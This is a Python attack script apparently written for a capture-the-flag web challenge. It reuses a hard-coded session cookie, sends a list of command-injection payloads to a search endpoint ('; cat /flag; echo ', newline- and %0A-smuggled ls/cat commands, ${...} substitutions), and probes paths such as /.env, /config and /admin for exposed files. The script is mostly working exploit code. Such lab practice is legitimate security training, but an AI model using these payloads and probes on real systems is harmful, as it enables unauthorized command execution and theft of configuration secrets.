import requests
from bs4 import BeautifulSoup
import re

# Base URL
base_url = "https://poiuytrewqas-csc26.cybersecuritychallenge.al"

# Create session
session = requests.Session()

# Try to access dashboard with the provided session cookie
session.cookies.set('session', 'eyJ1c2VyIjoiYWxwZXRnIn0.aXymyw.GBEYMO9Mn9kpHr1J86YGyGs4CsE')

print("[+] Accessing dashboard with provided session...")
dashboard_url = f"{base_url}/dashboard"
response = session.get(dashboard_url)
print(f"[+] Dashboard status: {response.status_code}")

if response.status_code == 200:
    print("\n[+] Dashboard content:")
    soup = BeautifulSoup(response.text, 'html.parser')
    print(soup.prettify()[:1000])
    
    # Look for any flags in the dashboard
    if "CSC26{" in response.text:
        print("\n[!] FLAG FOUND IN DASHBOARD!")
        flags = re.findall(r'CSC26\{[^}]+\}', response.text)
        for flag in flags:
            print(f"[!] {flag}")

# Test search functionality
print("\n[+] Testing search functionality...")
search_url = f"{base_url}/search"

# Try a basic search first to see the output format
print("\n[*] Testing basic search with 'test'")
response = session.post(search_url, data={"q": "test"})
print(f"[*] Status: {response.status_code}")
soup = BeautifulSoup(response.text, 'html.parser')
main_content = soup.find('main')
if main_content:
    print(f"[*] Search result content:\n{main_content.get_text()}\n")
    print(f"[*] Full HTML:\n{main_content.prettify()[:500]}")

# Try various payloads
test_payloads = [
    "flag",
    "'; cat /flag; echo '",
    "'; cat /flag.txt; echo '",
    "'; ls -la; echo '",
    "\n/bin/ls\n",
    "\n/bin/cat /flag\n",
    "test\nls",
    "test\ncat /flag",
    "test\\nls",
    "%0Als",
    "%0Acat%20/flag",
    "${ls}",
    "${cat /flag}",
]

for payload in test_payloads:
    print(f"\n[*] Testing: {repr(payload)}")
    response = session.post(search_url, data={"q": payload})
    
    # Check if response is different or contains flag
    if "CSC26{" in response.text:
        print(f"[!] FLAG FOUND!")
        flags = re.findall(r'CSC26\{[^}]+\}', response.text)
        for flag in flags:
            print(f"[!] {flag}")
        print(f"\n[!] Full response:\n{response.text}")
        break
    elif response.status_code != 200:
        print(f"[*] Status: {response.status_code}")
        print(f"[*] Response: {response.text[:500]}")
    else:
        # Look for differences in response
        soup = BeautifulSoup(response.text, 'html.parser')
        main_content = soup.find('main')
        if main_content:
            text = main_content.get_text().strip()
            # Only print if different from standard response
            if "Results for" in text or "found" in text.lower() or len(text) > 150:
                print(f"[*] Content: {text[:300]}")

# Try to access other common endpoints
print("\n[+] Trying other endpoints...")
endpoints = [
    "/flag",
    "/flag.txt",
    "/.env",
    "/config",
    "/admin",
    "/debug",
]

for endpoint in endpoints:
    url = f"{base_url}{endpoint}"
    response = session.get(url)
    if response.status_code == 200 and len(response.text) < 5000:
        print(f"\n[*] {endpoint} - Status: {response.status_code}")
        print(f"[*] Content: {response.text[:500]}")
        if "CSC26{" in response.text:
            print(f"[!] FLAG FOUND at {endpoint}!")
            flags = re.findall(r'CSC26\{[^}]+\}', response.text)
            for flag in flags:
                print(f"[!] {flag}")
